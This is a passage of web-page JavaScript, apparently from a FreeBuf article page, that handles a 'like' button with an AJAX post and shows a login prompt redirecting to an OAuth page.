                                        var login = $(this).attr('data-status');
                                        if(login){
                                            var token = $('#token').val();
                                            var id = $(this).attr('data-id');
                                            var good = $('.good_num').text();
                                            var _this = $(this);
                                            var _url = document.location.href;
                                            $.ajax({
                                                type: "post",
                                                url: _url,
                                                data: {'token':token,'id':id, 'good':1},
                                                success: function (data) {
                                                    $('#token').val(data.token);
                                                    if(data.code ==400){
                                                        layer.open({
                                                            title: '系统提示',
                                                            btnAlign: 'c',
                                                            content: data.msg,
                                                            area: '278px',
                                                        });
                                                    }else {
                                                        if(good){
                                                            good++;
                                                        }else {
                                                            good=1;
                                                        }
                                                        $('.good_num').text(good);
                                                        _this.disabled();
                                                    }
                                                },
                                            })
                                        }else {
                                            layer.open({
                                                title: '系统提示',
                                                btnAlign: 'c',
                                                content: '请先登录',
                                                btn: ['登录'],
                                                area: '278px',
                                                yes: function () {
                                                    login();
                                                },
                                            });
                                        }
                                        return false;
                                    })
                                    function login(){
                                        window.location.href = 'https//www.freebuf.com/oauth';
                                    }
                                </script>
                                                    </div>
                        <div class="wechatcodeDiv">